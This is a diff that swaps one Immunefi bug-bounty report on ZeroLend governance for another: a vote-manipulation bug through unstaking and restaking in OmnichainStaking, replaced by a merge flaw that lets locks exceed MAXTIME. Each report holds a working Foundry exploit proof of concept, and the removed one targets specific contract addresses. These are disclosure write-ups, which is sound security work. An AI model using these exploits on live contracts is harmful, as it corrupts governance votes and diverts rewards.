@@ -1,242 +1,174 @@
-# Attackers can control the vote result and amplify target gauge's share
 
-Submitted  about 2 months  ago by @offside0011 (Whitehat)  for  [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost)
+# ZeroLocker:merge can make a voting lock last longer than MAXTIME and inflate voting power
 
+Submitted on Thu Feb 29 2024 19:23:04 GMT-0400 (Atlantic Standard Time) by @g10v1 for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)
 
-
-Report ID: #28912
+Report ID: #28892
 
 Report type: Smart Contract
 
-Has PoC?: Yes
-
 Target: https://github.com/zerolend/governance
 
-Impacts
+Impacts:
+- Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
 
--   Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
+## Description
+I have previously reported an issue called  "ZeroLocker:merge can make a voting lock last longer than 4 years" as a primary medium-severity issue at Cantina's contest as there wasn't a voting power calculation function at that codebase. I am reporting it again as the impact at the codebase in Immunefi's scope is higher and presents a significance for the voting mechanics.
+## Brief/Intro
 
-## Details
-
-
-There is on lock on  `PoolVoter.sol`. The voting results can be manipulated by repeatedly staking and unstaking in OmnichainStaking.
+The BaseLocker contract allows users to merge two different locks and end up with a lock that has a longer than MAXTIME difference between the end time and start time. This inflates the calculation of voting power for locks and give them an unfair advantage on governance.
 
 ## Vulnerability Details
-
-Users can obtain NFTs by locking their zero tokens in either  `lockerLp`  or  `lockerToken`. After acquiring the NFT, they can stake it in the  `OmnichainStaking`  to earn the corresponding token. Subsequently, they gain the ability to vote through PoolVoter, allowing them to control the share of the respective pool. When users vote, the PoolVoter.sol directly uses their balance in OmnichainStaking to determine their voting weight.
-
-```
-    function _vote(
-        address _who,
-        address[] memory _poolVote,
-        uint256[] memory _weights
-    ) internal {
-        // require(ve(_ve).isApprovedOrOwner(msg.sender, _tokenId));
-        _reset(_who);
-        uint256 _poolCnt = _poolVote.length;
-        uint256 _weight = staking.balanceOf(_who);
-        uint256 _totalVoteWeight = 0;
-        uint256 _usedWeight = 0;
-
+The merge method enables a user to bypass the MAXTIME requirement by creating two different locks that last MAXTIME, one at Time0 and the second one some time later at Time1 then merging with the first lock as the merge target (or **to** argument) at the merge call:
+```solidity
+function merge(uint256 _from, uint256 _to) external override {
 ```
 
-Although there are some checks in OmnichainStaking to avoid transfer between users
+As the merge function at the BaseLocker contract does not check whether the end minus the locked0.start is not greater than MAXTIME, it enables arbitrary-sized lock durations:
+```solidity
+LockedBalance memory _locked0 = locked[_from];
+        LockedBalance memory _locked1 = locked[_to];
+        uint256 value0 = uint256(int256(_locked0.amount));
+        uint256 end = _locked0.end >= _locked1.end
+            ? _locked0.end
+            : _locked1.end;
 
+        locked[_from] = LockedBalance(0, 0, 0, 0);
+
+        _burn(_from);
+        _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
 ```
-    function transfer(address, uint256) public pure override returns (bool) {
-        // don't allow users to transfer voting power. voting power can only
-        // be minted or burnt and act like SBTs
-        require(false, "transfer disabled");
-        return false;
+
+The depositFor internal method updates the lock, but it doesn't check the end timestamp and the start timestamp difference either, the only sanity check is in regards to unlockTime != 0:
+```solidity
+if (_unlockTime != 0) lock.end = _unlockTime;
+```
+
+This enables calculatePower to utilize a numerator bigger than MAXTIME, inflating locks amounts voting power:
+```solidity
+function _calculatePower(
+        LockedBalance memory lock
+    ) internal view returns (uint256) {
+        return ((lock.end - lock.start) * lock.amount) / MAXTIME;
     }
-
-    function transferFrom(
-        address,
-        address,
-        uint256
-    ) public pure override returns (bool) {
-        // don't allow users to transfer voting power. voting power can only
-        // be minted or burnt and act like SBTs
-        require(false, "transferFrom disabled");
-        return false;
-    }
-
-```
-
-This check can be bypassed by unstaking directly and then staking it for another user.
-
-```
-        if (data.length > 0) from = abi.decode(data, (address));
-
-        // if the stake is from the LP locker, then give 4 times the voting power
-        if (msg.sender == address(lpLocker)) {
-            lpPower[tokenId] = lpLocker.balanceOfNFT(tokenId);
-            _mint(from, lpPower[tokenId] * 4);
-        }
-        // if the stake is from a regular token locker, then give 1 times the voting power
-        else if (msg.sender == address(tokenLocker)) {
-            tokenPower[tokenId] = tokenLocker.balanceOfNFT(tokenId);
-            _mint(from, tokenPower[tokenId]);
-        } else require(false, "invalid operator");
-
 ```
 
 ## Impact Details
-
-The voting results can be manipulated and amplified, and the gauge pool rewards weight is based on the results of the voting. Therefore, attackers can exploit this to gain additional profits.
-
--   TIP1: Through auditing the code, another issue in the profit distribution process may be discovered. By manipulating the voting ratio at that moment, attackers can gain more profits. However, this second vulnerability would be analyzed more after fixing the first one.
--   TIP2: There is a bug in PoolVoter.sol, the bool check is wrong
-
-```
-    function registerGauge(
-        address _asset,
-        address _gauge
-    ) external onlyOwner returns (address) {
-        if (isPool[_asset]) {
-            _pools.push(_asset);
-            isPool[_asset] = true;
-        }
-
-```
-
--   TIP3 Another bug in voters.ts, the  `governance.vestedZeroNFT.target`  and  `lending.protocolDataProvider.target`  is wrong.
-
-```
-  await factory.setAddresses(
-    guageImpl.target,
-    governance.zero.target,
-    eligibilityCriteria.target,
-    governance.lending.oracle.target,
-    // lending.protocolDataProvider.target,
-    governance.vestedZeroNFT.target,
-    lending.protocolDataProvider.target
-  );
-
-```
-
+The whole voting mechanics is spoofed as merging allows users to have voting powers bigger than the maximum possible for the amounts deposited. This effectively makes governance a game of merging locks at the last possible moment before a voting start in order to have ever-increasing voting powers.
 ## References
-
-[https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L98](https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L98)  [https://github.com/zerolend/governance/blob/main/contracts/locker/OmnichainStaking.sol#L60](https://github.com/zerolend/governance/blob/main/contracts/locker/OmnichainStaking.sol#L60)
-
-### Proof of concept
-
-```
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
-
-import "forge-std/Test.sol";
-import "./interface.sol";
-/*
-poolVoter 0x3818eAb6Ca8Bf427222bfACFA706c514145F4104
-lockerToken 0x92b0d1Cc77b84973B7041CB9275d41F09840eaDd
-omnichainStaking 0x9eb52339B52e71B1EFD5537947e75D23b3a7719B
-zero 0x9f62EE65a8395824Ee0821eF2Dc4C947a23F0f25
-vestedZeroNFT 0x20BBE62B175134D21b10C157498b663F048672bA
-*/
-
-IERC20 constant zero = IERC20(0x9f62EE65a8395824Ee0821eF2Dc4C947a23F0f25);
-isakte constant stake = isakte(0x9eb52339B52e71B1EFD5537947e75D23b3a7719B);
-PoolVoter constant poolVoter = PoolVoter(0x3818eAb6Ca8Bf427222bfACFA706c514145F4104);
-iLockerToken constant lockerToken = iLockerToken(0x92b0d1Cc77b84973B7041CB9275d41F09840eaDd);
-
-interface iLockerToken {
-    function underlying() external returns (address);
-    function createLock(
-        uint256 _value,
-        uint256 _lockDuration,
-        bool _stakeNFT
-    ) external returns (uint256);
-    function safeTransferFrom(address,address,uint256,bytes memory) external;
-}
-
-interface isakte {
-    function unstakeToken(uint256 tokenId) external;
-}
-
-interface PoolVoter {
-    function pools() external returns (address[] memory);
-    function owner() external returns (address);
-    function length() external returns (uint256);
-    function weights(address) external returns (uint256);
-    function registerGauge(
-        address _asset,
-        address _gauge
-    ) external;
-    function vote(
-        address[] calldata _poolVote,
-        uint256[] calldata _weights
-    ) external;
-}
-
-
-contract Main is Test {
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8545");
-
-
-    }
-
-    function testEXP() public {
-
-        address owner = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
-        deal(address(stake), address(owner), 1 ether);
-        vm.startPrank(owner);
-        poolVoter.registerGauge(address(1), address(11111));
-
-
-        poolVoter.registerGauge(address(3), address(22222));
-
-        address[] memory pools = new address[](3);
-        uint256[] memory weights = new uint256[](3);
-        pools[0] = address(1);
-        pools[1] = address(3);
-        weights[0] = 5;
-        weights[1] = 5;
-        poolVoter.vote(pools, weights);
-        vm.stopPrank();
-        address[] memory p= poolVoter.pools();
-        console.log('Before:');
+Snippet in which merge doesn't check the total duration of the lock: https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L180C8-L185C28
+CalculatePower internal method: https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L112C4-L117C1
         
-        for (uint i = 0; i < 3; i++) {
-            console.log('Pool', i);
-            console.log(poolVoter.weights(p[i]));            
-        }
+## Proof of concept
+### PoC
+Set up foundry on hardhat by placing
+```solidity
+import "@nomicfoundation/hardhat-foundry";
+```
+at the hardhat.config.ts file. Don't forget to install "@nomicfoundation/hardhat-foundry".
+Then install foundry at the contracts folder with the following command:
+```solidity
+forge init --force
+```
 
-        deal(address(zero), address(this), 1 ether);
-        zero.approve(address(lockerToken), 1 ether);
-        uint256 nftid = lockerToken.createLock(1 ether, 365 * 86400, false);
-        lockerToken.safeTransferFrom(address(this), address(stake), nftid, abi.encode(address(this)));
+Install openzeppelin contracts at foundry:
+```solidity
+forge install Openzeppelin/openzeppelin-contracts@v5.0.1 --no-commit
+forge install OpenZeppelin/openzeppelin-contracts-upgradeable --no-commit
+```
 
-        address[] memory pools2 = new address[](3);
-        uint256[] memory weights2 = new uint256[](3);
-        pools2[0] = p[0];
-        weights2[0] = 5;
-        console.log('After attack vote:');
-        poolVoter.vote(pools2, weights2);
-        for (uint i = 0; i < 3; i++) {
-            console.log('Pool', i);
-            console.log(poolVoter.weights(p[i]));            
-        }
-        stake.unstakeToken(nftid);
-        console.log('Transfer nft to hack2(0xdeadbeef)');
-        lockerToken.safeTransferFrom(address(this), address(stake), nftid, abi.encode(address(0xdeadbeef)));
+Place the following code-snippet at the Test.t.sol file inside the test folder:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
-        vm.startPrank(address(0xdeadbeef));
-        poolVoter.vote(pools2, weights2);
-        for (uint i = 0; i < 3; i++) {
-            console.log('Pool', i);
-            console.log(poolVoter.weights(p[i]));            
-        }
+import {console} from "../../lib/forge-std/src/console.sol";
+import {StdInvariant} from "../../lib/forge-std/src/StdInvariant.sol";
+import {LockerLP} from "../../locker/LockerLP.sol";
+import {Test} from "../../lib/forge-std/src/Test.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract MintableERC20 is ERC20 {
+    address public owner;
+
+    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
+        owner = msg.sender;
     }
 
-    function onERC721Received(
-        address,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
-        return this.onERC721Received.selector; 
+    modifier onlyOwner() {
+        require(msg.sender == owner, "MintableERC20: caller is not the owner");
+        _;
     }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+contract ZeroLendTest is StdInvariant, Test {
+
+    LockerLP lockerLP;
+    MintableERC20  arbitraryToken;
+    address user = makeAddr("user");
+    address public configurator = makeAddr("configurator");
+    uint256 internal WEEK;
+    uint256 internal MAXTIME;
+
+    function setUp() public {
+        vm.prank(configurator);
+        arbitraryToken = new MintableERC20("Arbitrary Token", "ATKN");
+        vm.prank(configurator);
+        arbitraryToken.mint(user, 1 ether);
+
+
+        vm.prank(configurator);
+        lockerLP = new LockerLP();
+
+        lockerLP.init(
+            address(arbitraryToken),
+            // staking address
+            address(0x1000),
+            // stakingBonus
+            address(0x1001)
+        );
+
+        WEEK = 1 weeks;
+        // MAXTIME is set to 1 year as it is the value set at the initialization of the LockerLP contract
+        MAXTIME = 365 * 86400;
+
+    }
+ 
+    function test_poc() public {
+
+        vm.prank(user);
+        arbitraryToken.approve(address(lockerLP), 1 ether);
+
+        uint256 unlockTime0 = ((block.timestamp + MAXTIME) / WEEK) * WEEK; // Locktime is rounded down to weeks
+        vm.prank(user);
+        lockerLP.createLock(0.5 ether, unlockTime0, false);
+
+        // pass some time
+        vm.warp(block.timestamp + WEEK);
+
+        uint256 unlockTime1 = ((block.timestamp + MAXTIME) / WEEK) * WEEK - 100; // Locktime is rounded down to weeks
+        vm.prank(user);
+        lockerLP.createLock(0.5 ether, unlockTime1, false);
+
+        vm.prank(user);
+        lockerLP.merge(2, 1);
+
+        (uint256 amountLocked, uint256 end, uint256 start,) = lockerLP.locked(1);
+        // check if amount locked is 1 ether
+        require(amountLocked == 1 ether, "wrong amount locked");
+
+        // check the difference between the end and the start 
+        require(end - start > MAXTIME, "lock duration is not over 1 year");
+       
+        // check if voting power is bigger than what should be possible
+        uint256 maxVotingPower = MAXTIME * amountLocked / MAXTIME;
+        uint256 currentVotingPower = (end - start) * amountLocked / MAXTIME;
+        require(currentVotingPower > maxVotingPower, "current voting power is not bigger than maximum expected value");
+    }
+
 }
 ```
